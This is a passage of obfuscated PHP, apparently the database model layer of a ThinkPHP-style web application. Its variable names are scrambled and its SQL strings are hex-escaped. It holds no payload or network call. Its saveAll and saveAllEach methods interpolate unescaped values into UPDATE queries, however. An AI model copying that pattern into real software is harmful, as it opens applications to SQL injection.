if (is_string($ßœ∂∑‘æ)) { $‘íˆâ¶…[$ßœ∂∑‘æ] = $Íçﬁø§; } $≈Ìçé©∫ = array(); foreach ($‘íˆâ¶… as $äÊÑ˜”Ê => $≈˜”ò˘È) { if (is_null($≈˜”ò˘È) && is_string($äÊÑ˜”Ê)) { $Ìãæ‹–„->where(array($•ÆóÚ∑Ø => $ÔƒÌË÷…, $∂çÀŸ—ó[458] => $äÊÑ˜”Ê))->delete(); continue; } $this->checkLength($≈˜”ò˘È, !1, $≤ÍÛïâ¥ . $∂çÀŸ—ó[4] . $äÊÑ˜”Ê); $≈Ìçé©∫[] = array($•ÆóÚ∑Ø => $ÔƒÌË÷…, $∂çÀŸ—ó[97] => $äÊÑ˜”Ê, $∂çÀŸ—ó[459] => $≈˜”ò˘È); } $ò˝–…≈ç = $∂çÀŸ—ó[460] . $≤ÍÛïâ¥; CacheLock::lock($ò˝–…≈ç); $Ìãæ‹–„->where(array($•ÆóÚ∑Ø => $ÔƒÌË÷…))->addAll($≈Ìçé©∫, array(), !0); CacheLock::unlock($ò˝–…≈ç); return !0; } public function metaGet($òÕ¸∂Ì, $˙…Ö¬Âó = false) { $à√ÙÇæ± =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->tableMeta) { return array(); } $˘÷˚¨€Å = $this->tableMeta[$à√ÙÇæ±[456]]; $¡Œïá¬ú = Model($this->tableMeta[$à√ÙÇæ±[457]]); if ($˙…Ö¬Âó) { $∆ãÍÏµ˜ = array($˘÷˚¨€Å => $òÕ¸∂Ì, $à√ÙÇæ±[97] => $˙…Ö¬Âó); return $¡Œïá¬ú->where($∆ãÍÏµ˜)->getField($à√ÙÇæ±[459]); } $∆ãÍÏµ˜ = array($˘÷˚¨€Å => $òÕ¸∂Ì); $´»œΩÙË = $¡Œïá¬ú->field($à√ÙÇæ±[461])->where($∆ãÍÏµ˜)->select(); $´»œΩÙË = array_to_keyvalue($´»œΩÙË, $à√ÙÇæ±[97], $à√ÙÇæ±[459]); return $´»œΩÙË; } private function checkDataAutoHas($Â¸Ò≤Îû) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Û œ„‰Ê) { if (in_array($Â¸Ò≤Îû, explode($_SERVER[ß⁄ˆÇ†Œ][50], $Û œ„‰Ê[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$üË„ªô€, $Ωœ≈ö•…) { $∏¯⁄…Ëç =& $_SERVER[ß⁄ˆÇ†Œ]; if (!is_array($üË„ªô€)) { return; } foreach ($this->dataAuto as $÷Ô∞ƒ‹˜) { $Ê≠â¬Ÿ— = $÷Ô∞ƒ‹˜[0]; if (!in_array($Ωœ≈ö•…, explode($∏¯⁄…Ëç[50], $÷Ô∞ƒ‹˜[2]))) { continue; } switch (trim($÷Ô∞ƒ‹˜[3])) { case $∏¯⁄…Ëç[406]: case $∏¯⁄…Ëç[407]: $„‰Æ…©Ó = $÷Ô∞ƒ‹˜[1]; $˘¶è˚˙— = isset($÷Ô∞ƒ‹˜[4]) ? (array) $÷Ô∞ƒ‹˜[4] : array(); if ($„‰Æ…©Ó == $∏¯⁄…Ëç[206] && array_key_exists($Ê≠â¬Ÿ—, $üË„ªô€)) { if (!$üË„ªô€[$Ê≠â¬Ÿ—]) { unset($üË„ªô€[$Ê≠â¬Ÿ—]); } break; } if (isset($üË„ªô€[$Ê≠â¬Ÿ—])) { array_unshift($˘¶è˚˙—, $üË„ªô€[$Ê≠â¬Ÿ—]); } if ($∏¯⁄…Ëç[406] == $÷Ô∞ƒ‹˜[3]) { $üË„ªô€[$Ê≠â¬Ÿ—] = call_user_func_array($„‰Æ…©Ó, $˘¶è˚˙—); } else { $üË„ªô€[$Ê≠â¬Ÿ—] = call_user_func_array(array(&$this, $„‰Æ…©Ó), $˘¶è˚˙—); } break; case $∏¯⁄…Ëç[356]: if (isset($üË„ªô€[$Ê≠â¬Ÿ—]) && $üË„ªô€[$Ê≠â¬Ÿ—]) { $üË„ªô€[$Ê≠â¬Ÿ—] = call_user_func_array(array(&$this, $÷Ô∞ƒ‹˜[1]), array($üË„ªô€[$Ê≠â¬Ÿ—])); } break; case $∏¯⁄…Ëç[359]: $üË„ªô€[$Ê≠â¬Ÿ—] = $üË„ªô€[$÷Ô∞ƒ‹˜[1]]; break; case $∏¯⁄…Ëç[379]: if (isset($üË„ªô€[$Ê≠â¬Ÿ—]) && !is_string($üË„ªô€[$Ê≠â¬Ÿ—])) { $üË„ªô€[$Ê≠â¬Ÿ—] = json_encode_force($üË„ªô€[$Ê≠â¬Ÿ—]); } break; case $∏¯⁄…Ëç[408]: if ($üË„ªô€[$Ê≠â¬Ÿ—] === $∏¯⁄…Ëç[12]) { unset($üË„ªô€[$Ê≠â¬Ÿ—]); } break; case $∏¯⁄…Ëç[409]: $üË„ªô€[$Ê≠â¬Ÿ—] = $÷Ô∞ƒ‹˜[1]; default: break; } } if ($Ωœ≈ö•… == $∏¯⁄…Ëç[440]) { $Ω∫Ê€Í˘ = strtolower($this->db->getDbType()); if (strpos($Ω∫Ê€Í˘, $∏¯⁄…Ëç[13]) !== 0) { return; } $Õ∫°ì“— = $this->field(!0)->fields; $úæø—Œî = $Õ∫°ì“—[$∏¯⁄…Ëç[338]]; if (isset($Õ∫°ì“—[$∏¯⁄…Ëç[337]])) { unset($úæø—Œî[$Õ∫°ì“—[$∏¯⁄…Ëç[337]]]); } foreach ($úæø—Œî as $ Ã∑Õõä => $Ωœ≈ö•…) { if (!isset($üË„ªô€[$ Ã∑Õõä])) { $üË„ªô€[$ Ã∑Õõä] = $∏¯⁄…Ëç[12]; } } } } private function dataAfterFilter(&$∞∏ÎÛ®º) { $ÄÛÜÔë∂ =& $_SERVER[ß⁄ˆÇ†Œ]; foreach ($this->dataAuto as $∫ÜÕ∞ªÛ) { $ÄõÄΩÒÛ = $∫ÜÕ∞ªÛ[0]; if (!isset($∞∏ÎÛ®º[$ÄõÄΩÒÛ])) { continue; } if (!in_array($ÄÛÜÔë∂[442], explode($ÄÛÜÔë∂[50], $∫ÜÕ∞ªÛ[2]))) { continue; } switch (trim($∫ÜÕ∞ªÛ[3])) { case $ÄÛÜÔë∂[406]: case $ÄÛÜÔë∂[407]: $¬Ø∏Û˙â = isset($∫ÜÕ∞ªÛ[4]) ? (array) $∫ÜÕ∞ªÛ[4] : array(); array_unshift($¬Ø∏Û˙â, $∞∏ÎÛ®º[$ÄõÄΩÒÛ]); if (isset($∫ÜÕ∞ªÛ[4]) && $∫ÜÕ∞ªÛ[4] == $ÄÛÜÔë∂[462]) { $¬Ø∏Û˙â = array($∞∏ÎÛ®º[$ÄõÄΩÒÛ]); } if ($ÄÛÜÔë∂[406] == $∫ÜÕ∞ªÛ[3]) { $∞∏ÎÛ®º[$ÄõÄΩÒÛ] = call_user_func_array($∫ÜÕ∞ªÛ[1], $¬Ø∏Û˙â); } else { $∞∏ÎÛ®º[$ÄõÄΩÒÛ] = call_user_func_array(array(&$this, $∫ÜÕ∞ªÛ[1]), $¬Ø∏Û˙â); } break; case $ÄÛÜÔë∂[356]: if (isset($∞∏ÎÛ®º[$ÄõÄΩÒÛ]) && $∞∏ÎÛ®º[$ÄõÄΩÒÛ]) { $∞∏ÎÛ®º[$ÄõÄΩÒÛ] = call_user_func_array(array(&$this, $∫ÜÕ∞ªÛ[1]), array($∞∏ÎÛ®º[$ÄõÄΩÒÛ])); } break; case $ÄÛÜÔë∂[359]: $∞∏ÎÛ®º[$ÄõÄΩÒÛ] = $∞∏ÎÛ®º[$∫ÜÕ∞ªÛ[1]]; break; case $ÄÛÜÔë∂[379]: $ñàÜ¿˛Ñ = $∞∏ÎÛ®º[$ÄõÄΩÒÛ]; $∞∏ÎÛ®º[$ÄõÄΩÒÛ] = json_decode($ñàÜ¿˛Ñ, !0); if (is_null($∞∏ÎÛ®º[$ÄõÄΩÒÛ])) { $∞∏ÎÛ®º[$ÄõÄΩÒÛ] = $ñàÜ¿˛Ñ; } break; case $ÄÛÜÔë∂[408]: if ($∞∏ÎÛ®º[$ÄõÄΩÒÛ] === $ÄÛÜÔë∂[12]) { unset($∞∏ÎÛ®º[$ÄõÄΩÒÛ]); } break; case $ÄÛÜÔë∂[409]: $∞∏ÎÛ®º[$ÄõÄΩÒÛ] = $∫ÜÕ∞ªÛ[1]; break; default: break; } } } public function saveAll($≈Ñ»ÏÍÂ) { $˛•é•‹Ω =& $_SERVER[ß⁄ˆÇ†Œ]; $®¢®‹âö = $this->tablePrefix . $this->tableName; $‰¢“˜ß¯ = self::SQL_WHERE_IN_CHUNK; $≈Ñ»ÏÍÂ = is_array($≈Ñ»ÏÍÂ) ? $≈Ñ»ÏÍÂ : array(); $±®˘€˙Ì = $˛•é•‹Ω[329]; $ ∑Û∂∆¡ = 0; $çŸå¿Õ∂ = array(); $·ŸÈÅ°ñ = count($≈Ñ»ÏÍÂ); for ($–‡¶¨‚° = 0; $–‡¶¨‚° < $·ŸÈÅ°ñ; $–‡¶¨‚°++) { $§˘Üë∂Û = $≈Ñ»ÏÍÂ[$–‡¶¨‚°]; if (!is_array($§˘Üë∂Û) || count($§˘Üë∂Û) != 4) { continue; } $Î…Î˚¸ª = "\x55\120\104\101\124\105\40\140{$®¢®‹âö}\140\40\123\x45\x54\40{$§˘Üë∂Û[2]}\40\x3d\40\103\x41\x53\105\40{$§˘Üë∂Û[0]}\40\12"; if ($ ∑Û∂∆¡ == 0) { $±®˘€˙Ì = $Î…Î˚¸ª; } $çŸå¿Õ∂[] = $˛•é•‹Ω[121] . $§˘Üë∂Û[1] . $˛•é•‹Ω[121]; $ ∑Û∂∆¡++; $±®˘€˙Ì .= "\x20\127\x48\105\116\40\x27{$§˘Üë∂Û[1]}\47\x20\124\x48\x45\x4e\40\x27{$§˘Üë∂Û[3]}\47\x20\12"; if ($ ∑Û∂∆¡ == $‰¢“˜ß¯ || $–‡¶¨‚° == $·ŸÈÅ°ñ - 1) { $ôê°ç˜∞ = implode($˛•é•‹Ω[50], $çŸå¿Õ∂); $±®˘€˙Ì .= "\40\x45\x4e\x44\40\40\127\x48\105\122\x45\x20{$§˘Üë∂Û[0]}\40\111\x4e\40\50{$ôê°ç˜∞}\x29\x20"; $this->execute($±®˘€˙Ì); $ ∑Û∂∆¡ = 0; $±®˘€˙Ì = $Î…Î˚¸ª; $this->chunkEventCheck(count($çŸå¿Õ∂)); $çŸå¿Õ∂ = array(); } } $this->chunkEventSet(); } public function saveAllEach($µƒ≤ﬁåÛ) { $à˙‘âÉ⁄ =& $_SERVER[ß⁄ˆÇ†Œ]; $¬Œ”¯ñÃ = $this->tablePrefix . $this->tableName; foreach ($µƒ≤ﬁåÛ as $è¡—õ˙ú) { if (!is_array($è¡—õ˙ú) || count($è¡—õ˙ú) != 4) { continue; } $ò≠ø∫å± = $è¡—õ˙ú[0] . $à˙‘âÉ⁄[463] . $è¡—õ˙ú[1] . $à˙‘âÉ⁄[121]; $ÃâÆèü‰ = $è¡—õ˙ú[2] . $à˙‘âÉ⁄[463] . $è¡—õ˙ú[3] . $à˙‘âÉ⁄[121]; $ºËÓπÕÜ = "\165\x70\144\141\x74\x65\40{$¬Œ”¯ñÃ}\40\x73\145\164\40{$ÃâÆèü‰}\40\167\x68\x65\x72\x65\x20{$ò≠ø∫å±}\73"; $this->execute($ºËÓπÕÜ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($≠†˝ûÛÈ = false, $È¶ÃÛ»ß = false) { $this->_chunkEvent = $≠†˝ûÛÈ; $this->_chunkEventParam = $È¶ÃÛ»ß; } private function chunkEventCheck($˙ÅãéÎß) { if (!$this->_chunkEvent) { return; } $¯ú¢™ª› = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $¯ú¢™ª›[$_SERVER[ß⁄ˆÇ†Œ][464]] = $˙ÅãéÎß; Hook::trigger($this->_chunkEvent, $¯ú¢™ª›); } public function addAll($—÷⁄∫¶Ñ, $⁄‡ÅæËé = array(), $ØÍ…‹¿ı = false) { $“Æ§Öı˛ =& $_SERVER[ß⁄ˆÇ†Œ]; ignore_timeout(); $˛çÇ˙Ô = self::SQL_WHERE_IN_CHUNK; if (empty($—÷⁄∫¶Ñ)) { $this->error = think_lang($“Æ§Öı˛[357]); return !1; } $⁄‡ÅæËé = $this->_parseOptions($⁄‡ÅæËé); foreach ($—÷⁄∫¶Ñ as $ÀΩóÎ≠Ç => $“¬ŒåÕ‰) { $—÷⁄∫¶Ñ[$ÀΩóÎ≠Ç] = $this->_facade($“¬ŒåÕ‰); $this->_beforeInsert($—÷⁄∫¶Ñ[$ÀΩóÎ≠Ç], $⁄‡ÅæËé); } if (method_exists($this->db, $“Æ§Öı˛[358])) { for ($Ç”™ññÌ = 0; $Ç”™ññÌ < count($—÷⁄∫¶Ñ); $Ç”™ññÌ += $˛çÇ˙Ô) { $˝ ™∑ƒ∂ = array_slice($—÷⁄∫¶Ñ, $Ç”™ññÌ, $˛çÇ˙Ô); if (!is_array($˝ ™∑ƒ∂) || count($˝ ™∑ƒ∂) == 0) { break; } $°π™•‹˘ = $this->db->insertAll($˝ ™∑ƒ∂, $⁄‡ÅæËé, $ØÍ…‹¿ı); $this->chunkEventCheck(count($˝ ™∑ƒ∂)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($—÷⁄∫¶Ñ as $ÀΩóÎ≠Ç => $“¬ŒåÕ‰) { $°π™•‹˘ = $this->db->insert($“¬ŒåÕ‰, $⁄‡ÅæËé, $ØÍ…‹¿ı); } $this->commit(); } if (!1 !== $°π™•‹˘) { $®¨≠Ìí = $this->getLastInsID(); if ($®¨≠Ìí) { return $®¨≠Ìí; } } return $°π™•‹˘; } public function save($È´ﬂ∏”ê = '', $Ã»∑ëﬁÄ = array()) { $µÓóÒ”û =& $_SERVER[ß⁄ˆÇ†Œ]; $Ÿ‹Ë¨⁄á = self::SQL_WHERE_IN_CHUNK; $ƒÓÉΩ™™ = $this->optionsValue(); $ò¶ÿ„–œ = $this->findWhereField($ƒÓÉΩ™™); if (!$ò¶ÿ„–œ) { return parent::save($È´ﬂ∏”ê, $Ã»∑ëﬁÄ); } $˘‚ıÊ˚‰ = 0; $ÙÎÖ«âç = $ƒÓÉΩ™™[$µÓóÒ”û[361]][$ò¶ÿ„–œ][1]; $ÙÎÖ«âç = is_array($ÙÎÖ«âç) ? $ÙÎÖ«âç : array(); $°œ≈“«√ = count($ÙÎÖ«âç); for ($˙ö˝¯Ú˛ = 0; $˙ö˝¯Ú˛ < $°œ≈“«√; $˙ö˝¯Ú˛ += $Ÿ‹Ë¨⁄á) { $…¯⁄æÃî = array_slice($ÙÎÖ«âç, $˙ö˝¯Ú˛, $Ÿ‹Ë¨⁄á); if (!is_array($…¯⁄æÃî) || count($…¯⁄æÃî) == 0) { break; } $ƒÓÉΩ™™[$µÓóÒ”û[361]][$ò¶ÿ„–œ][1] = $…¯⁄æÃî; $this->optionsValue($ƒÓÉΩ™™); $˘‚ıÊ˚‰ += parent::save($È´ﬂ∏”ê, $Ã»∑ëﬁÄ); $this->chunkEventCheck(count($…¯⁄æÃî)); } $this->chunkEventSet(); return $˘‚ıÊ˚‰; } public function add($íÒ˝÷¿ì = '', $π™ëó¥ï = array(), $©÷ßë›Ω = false) { if ($this->addTaskStatus && is_array($íÒ˝÷¿ì)) { $this->addTaskData[] = $íÒ˝÷¿ì; return; } return parent::add($íÒ˝÷¿ì, $π™ëó¥ï, $©÷ßë›Ω); } public function parseWhereLike($°¶Ã«µ€, $øº∏ÍΩµ = '', $øà«¨ë√ = false, &$ÏÄÎÔ‡¸ = false) { $„¢±˙Äû =& $_SERVER[ß⁄ˆÇ†Œ]; $Öé©–Û„ = $GLOBALS[$„¢±˙Äû[6]][$„¢±˙Äû[465]]; if (!$Öé©–Û„[$„¢±˙Äû[466]]) { return $°¶Ã«µ€; } if (!is_array($°¶Ã«µ€)) { return $°¶Ã«µ€; } $‹ßÍ˝âÂ = array(); $ˆá†‡Â‘ = 0; foreach ($°¶Ã«µ€ as $ë°€—é© => $ÅÚ¶Áç˛) { if (is_array($ÅÚ¶Áç˛) && count($ÅÚ¶Áç˛) == 2 && $ÅÚ¶Áç˛[0] == $„¢±˙Äû[467] && is_string($ÅÚ¶Áç˛[1]) && substr($ÅÚ¶Áç˛[1], 0, 1) == $„¢±˙Äû[468] && substr($ÅÚ¶Áç˛[1], strlen($ÅÚ¶Áç˛[1]) - 1, 1) == $„¢±˙Äû[468]) { $ÏÄÎÔ‡¸ = !0; $•ö¬ıçã = is_string($ë°€—é©) ? $ë°€—é© : $øº∏ÍΩµ; $ì®¡´ƒÑ = substr($ÅÚ¶Áç˛[1], 1, strlen($ÅÚ¶Áç˛[1]) - 2); $ì®¡´ƒÑ = $this->db->escapeString($ì®¡´ƒÑ); if (!strpos($•ö¬ıçã, $„¢±˙Äû[10])) { $•ö¬ıçã = $„¢±˙Äû[469] . $•ö¬ıçã . $„¢±˙Äû[469]; } $ëÅ≥™ùŸ = $„¢±˙Äû[220] . $ì®¡´ƒÑ . $„¢±˙Äû[220]; $ì®¡´ƒÑ = str_replace(array($„¢±˙Äû[10], $„¢±˙Äû[470], $„¢±˙Äû[11]), $„¢±˙Äû[471], $ì®¡´ƒÑ); if ($Öé©–Û„[$„¢±˙Äû[472]]) { $ëÅ≥™ùŸ = $„¢±˙Äû[473] . $ì®¡´ƒÑ . $„¢±˙Äû[474]; if ($Öé©–Û„[$„¢±˙Äû[475]]) { $ëÅ≥™ùŸ = $„¢±˙Äû[474] . $ì®¡´ƒÑ . $„¢±˙Äû[473]; } } $‹ßÍ˝âÂ[$ˆá†‡Â‘] = $„¢±˙Äû[476] . $•ö¬ıçã . $„¢±˙Äû[477] . $ëÅ≥™ùŸ . $„¢±˙Äû[478]; $ˆá†‡Â‘++; continue; } if (is_array($ÅÚ¶Áç˛)) { $øº∏ÍΩµ = is_string($ë°€—é©) ? $ë°€—é© : $øº∏ÍΩµ; $ÅÚ¶Áç˛ = $this->parseWhereLike($ÅÚ¶Áç˛, $øº∏ÍΩµ, !0, $ÏÄÎÔ‡¸); } if (is_numeric($ë°€—é©)) { $‹ßÍ˝âÂ[$ˆá†‡Â‘] = $ÅÚ¶Áç˛; $ˆá†‡Â‘++; } else { $‹ßÍ˝âÂ[$ë°€—é©] = $ÅÚ¶Áç˛; } } if ($ÏÄÎÔ‡¸ && !$øà«¨ë√) { } return $‹ßÍ˝âÂ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($∞ü•∂Å = array()) { $õê˛òÛ‹ =& $_SERVER[ß⁄ˆÇ†Œ]; $π£éÇ√¨ = self::SQL_WHERE_IN_CHUNK; $ı≤«ùó„ = $this->optionsValue(); $‘©Ω˜¬° = $this->findWhereField($ı≤«ùó„); if (!$‘©Ω˜¬° || isset($ı≤«ùó„[$õê˛òÛ‹[377]]) || isset($ı≤«ùó„[$õê˛òÛ‹[438]])) { return parent::select($∞ü•∂Å); } $¡Ñ Ô√» = $ı≤«ùó„[$õê˛òÛ‹[361]][$‘©Ω˜¬°][1]; $¡Ñ Ô√» = is_array($¡Ñ Ô√») ? $¡Ñ Ô√» : array(); $äÎÿØﬂ∫ = null; for ($≥∏´ãÍ€ = 0; $≥∏´ãÍ€ < count($¡Ñ Ô√»); $≥∏´ãÍ€ += $π£éÇ√¨) { $€π—–Øô = array_slice($¡Ñ Ô√», $≥∏´ãÍ€, $π£éÇ√¨); if (!is_array($€π—–Øô) || count($€π—–Øô) == 0) { break; } $ı≤«ùó„[$õê˛òÛ‹[361]][$‘©Ω˜¬°][1] = $€π—–Øô; $this->optionsValue($ı≤«ùó„); $ÿ‚∏âãÓ = parent::select($∞ü•∂Å); if (!$ÿ‚∏âãÓ) { continue; } $äÎÿØﬂ∫ = is_array($äÎÿØﬂ∫) ? $äÎÿØﬂ∫ : array(); $äÎÿØﬂ∫ = array_merge($äÎÿØﬂ∫, $ÿ‚∏âãÓ); } return $äÎÿØﬂ∫; } public function delete($⁄∞◊Ÿ¯Ø = array()) { $⁄¢¿û¶Ó =& $_SERVER[ß⁄ˆÇ†Œ]; $ŸΩõæº = self::SQL_WHERE_IN_CHUNK; $ƒ§â¡æÇ = $this->optionsValue(); $¨§ø¬Ì˛ = $this->findWhereField($ƒ§â¡æÇ); if (!$¨§ø¬Ì˛) { return parent::delete($⁄∞◊Ÿ¯Ø); } $ÅÏÆÌÕê = 0; $Éåî˝ Ø = $ƒ§â¡æÇ[$⁄¢¿û¶Ó[361]][$¨§ø¬Ì˛][1]; $Éåî˝ Ø = is_array($Éåî˝ Ø) ? $Éåî˝ Ø : array(); for ($˙ÙÑòπà = 0; $˙ÙÑòπà < count($Éåî˝ Ø); $˙ÙÑòπà += $ŸΩõæº) { $ï°ÈÕ˙ô = array_slice($Éåî˝ Ø, $˙ÙÑòπà, $ŸΩõæº); if (!is_array($ï°ÈÕ˙ô) || count($ï°ÈÕ˙ô) == 0) { break; } $ƒ§â¡æÇ[$⁄¢¿û¶Ó[361]][$¨§ø¬Ì˛][1] = $ï°ÈÕ˙ô; $this->optionsValue($ƒ§â¡æÇ); $ÅÏÆÌÕê += parent::delete($⁄∞◊Ÿ¯Ø); } return $ÅÏÆÌÕê; } private function findWhereField($¨‘‡±Ïá) { $ê˘∞”ãË =& $_SERVER[ß⁄ˆÇ†Œ]; $úàì»Œµ = self::SQL_WHERE_IN_CHUNK; if (!is_array($¨‘‡±Ïá) || !is_array($¨‘‡±Ïá[$ê˘∞”ãË[361]])) { return !1; } foreach ($¨‘‡±Ïá[$ê˘∞”ãË[361]] as $±êä∏—Ç => $î‹ñæõÇ) { if (is_array($î‹ñæõÇ) && isset($î‹ñæõÇ[0]) && is_string($î‹ñæõÇ[0]) && strtolower($î‹ñæõÇ[0]) == $ê˘∞”ãË[7] && is_array($î‹ñæõÇ[1]) && count($î‹ñæõÇ[1]) > $úàì»Œµ) { ignore_timeout(); return $±êä∏—Ç; } } return !1; } public function setMasterDB($ª÷ﬂ”‰Ö = true) { think_config($_SERVER[ß⁄ˆÇ†Œ][479], $ª÷ﬂ”‰Ö); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\x74\x65\x6d\117\160\x74\151\x6f\156"; public $field = array(); public function listData($≥Ô∂Ç˝Å = false, $Ñ©˛Îú» = "\x6d\x6f\144\x69\146\171\x54\151\155\145", $—ô™¶ûÀ = false) { $ÔÔ˙≤Ñ˚ = Model($this->modelType)->get(!1, $this->optionType, !0); $†»ÈüÑ§ = array_values($ÔÔ˙≤Ñ˚); if ($†»ÈüÑ§ && $†»ÈüÑ§[0] && !is_array($†»ÈüÑ§[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ÔÔ˙≤Ñ˚ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ÔÔ˙≤Ñ˚) { return $≥Ô∂Ç˝Å ? null : array(); } if (!$≥Ô∂Ç˝Å) { $ÔÔ˙≤Ñ˚ = array_filter(array_values($ÔÔ˙≤Ñ˚)); return array_sort_by($ÔÔ˙≤Ñ˚, $Ñ©˛Îú», $—ô™¶ûÀ); } return $ÔÔ˙≤Ñ˚[$_SERVER[ß⁄ˆÇ†Œ][480] . $≥Ô∂Ç˝Å]; } public function insert($ó∂˙¢«©) { $æÑ—˘∂ﬁ =& $_SERVER[ß⁄ˆÇ†Œ]; $ó∂˙¢«© = array_field_key($ó∂˙¢«©, $this->field); $◊÷·Æëº = Model($this->modelType)->get($æÑ—˘∂ﬁ[481], $this->optionType . $æÑ—˘∂ﬁ[482]); $◊÷·Æëº = $◊÷·Æëº ? $◊÷·Æëº : 0; $ó∂˙¢«©[$æÑ—˘∂ﬁ[483]] = ++$◊÷·Æëº; $ó∂˙¢«©[$æÑ—˘∂ﬁ[231]] = time(); $ó∂˙¢«©[$æÑ—˘∂ﬁ[88]] = time(); Model($this->modelType)->set($æÑ—˘∂ﬁ[481], $◊÷·Æëº, $this->optionType . $æÑ—˘∂ﬁ[482]); Model($this->modelType)->set($æÑ—˘∂ﬁ[480] . $◊÷·Æëº, $ó∂˙¢«©, $this->optionType); return $◊÷·Æëº; } public function update($æê√√Àœ, $ΩÕ‚≠Å≥) { $Îﬂ°ÖåŒ =& $_SERVER[ß⁄ˆÇ†Œ]; $ΩÕ‚≠Å≥ = array_field_key($ΩÕ‚≠Å≥, $this->field); $–±Í¥˚Å = $this->listData($æê√√Àœ); if (!$–±Í¥˚Å || !$æê√√Àœ) { return !1; } $ΩÕ‚≠Å≥ = array_merge($–±Í¥˚Å, $ΩÕ‚≠Å≥); $ΩÕ‚≠Å≥[$Îﬂ°ÖåŒ[88]] = time(); return Model($this->modelType)->set($Îﬂ°ÖåŒ[480] . $æê√√Àœ, $ΩÕ‚≠Å≥, $this->optionType); } public function remove($õÁÆøà¡) { if (!$õÁÆøà¡) { return !1; } return Model($this->modelType)->remove($_SERVER[ß⁄ˆÇ†Œ][480] . $õÁÆøà¡, $this->optionType); } public function clear() { $™Òå£ç… =& $_SERVER[ß⁄ˆÇ†Œ]; Model($this->modelType)->remove($™Òå£ç…[481], $this->optionType . $™Òå£ç…[482]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Íåñ•È∏, $úÅÈ√ûó) { if (!$úÅÈ√ûó) { return !1; } $ˆ€òøõ’ = $this->listData(); $ˆ€òøõ’ = array_to_keyvalue($ˆ€òøõ’, $Íåñ•È∏); return isset($ˆ€òøõ’[$úÅÈ√ûó]) ? $ˆ€òøõ’[$úÅÈ√ûó] : !1; } public function findByName($’≥ΩßÒû) { return $this->findByKey($_SERVER[ß⁄ˆÇ†Œ][32], $’≥ΩßÒû); } protected function resetData($Ü°¯”‡÷) { $¡œ»•¿¥ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ü°¯”‡÷ = is_array($Ü°¯”‡÷) ? $Ü°¯”‡÷ : array(); $£˘®Ï≠  = array(); for ($ø–¥∫ÆÊ = 0; $ø–¥∫ÆÊ < count($Ü°¯”‡÷); $ø–¥∫ÆÊ++) { $£˘®Ï≠ [$¡œ»•¿¥[480] . $Ü°¯”‡÷[$ø–¥∫ÆÊ][$¡œ»•¿¥[483]]] = $Ü°¯”‡÷[$ø–¥∫ÆÊ]; } return Model($this->modelType)->set($£˘®Ï≠ , !1, $this->optionType); } private function getAutoName($¬ê≥€˛è) { $∞é∏µé≥ = array_to_keyvalue($this->listData(), $_SERVER[ß⁄ˆÇ†Œ][32]); if (!$∞é∏µé≥ || !isset($∞é∏µé≥[$¬ê≥€˛è])) { return $¬ê≥€˛è; } for ($Ó´≥£≈ª = 1; $Ó´≥£≈ª < count($∞é∏µé≥); $Ó´≥£≈ª++) { $Áó◊√é˙ = $¬ê≥€˛è . "\x28{$Ó´≥£≈ª}\x29"; if (!isset($∞é∏µé≥[$Áó◊√é˙])) { return $Áó◊√é˙; } } return $Áó◊√é˙; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ÿÕ÷ ˛¢ = false, $Ã–©Û¡∏ = '', $îä®§ªÆ = false) { $´ÌÃÖÆò =& $_SERVER[ß⁄ˆÇ†Œ]; $≥óﬁ™Í· = $this->cacheGet($Ã–©Û¡∏); $˙ô ¸ö¶ = $this->optionDefault($Ã–©Û¡∏); $˙ô ¸ö¶ = is_array($˙ô ¸ö¶) ? $˙ô ¸ö¶ : array(); if (is_array($≥óﬁ™Í·)) { $≥óﬁ™Í· = array_merge($˙ô ¸ö¶, $≥óﬁ™Í·); return $ÿÕ÷ ˛¢ ? isset($≥óﬁ™Í·[$ÿÕ÷ ˛¢]) ? $≥óﬁ™Í·[$ÿÕ÷ ˛¢] : null : $≥óﬁ™Í·; } $“öÉ≈»≠ = $this->filterWhere(array($´ÌÃÖÆò[33] => $Ã–©Û¡∏)); $≥óﬁ™Í· = $this->where($“öÉ≈»≠)->select(); $≥óﬁ™Í· = array_to_keyvalue($≥óﬁ™Í·, $´ÌÃÖÆò[97], $´ÌÃÖÆò[459]); foreach ($≥óﬁ™Í· as $˙Ô™˘Üâ => $¡ﬂÔæÒΩ) { if ($îä®§ªÆ || in_array($˙Ô™˘Üâ, $this->jsonField)) { $≥óﬁ™Í·[$˙Ô™˘Üâ] = json_decode($¡ﬂÔæÒΩ, !0); } } $this->cacheSet($Ã–©Û¡∏, $≥óﬁ™Í·); $≥óﬁ™Í· = array_merge($˙ô ¸ö¶, $≥óﬁ™Í·); return $ÿÕ÷ ˛¢ ? $≥óﬁ™Í·[$ÿÕ÷ ˛¢] : $≥óﬁ™Í·; } public function set($ùñ¥˘áø, $˚‡£í∂◊ = false, $‘ô¢Ÿ›è = '') { $ä∫¯ì≥ö =& $_SERVER[ß⁄ˆÇ†Œ]; $this->cacheRemove($‘ô¢Ÿ›è); $ˆ¨‘—Å≈ = array(); $›É“˘ëµ = is_array($ùñ¥˘áø) ? $ùñ¥˘áø : array($ùñ¥˘áø => $˚‡£í∂◊); foreach ($›É“˘ëµ as $¨±æŸµŸ => $›˙Œçﬂ§) { if (is_array($›˙Œçﬂ§)) { $›˙Œçﬂ§ = json_encode_force($›˙Œçﬂ§); } $this->checkLength($›˙Œçﬂ§, !1, $this->tableName . $ä∫¯ì≥ö[4] . $ùñ¥˘áø); $›˙Œçﬂ§ = self::textEncode($›˙Œçﬂ§); $›É“˘ëµ = array($ä∫¯ì≥ö[33] => $‘ô¢Ÿ›è, $ä∫¯ì≥ö[97] => 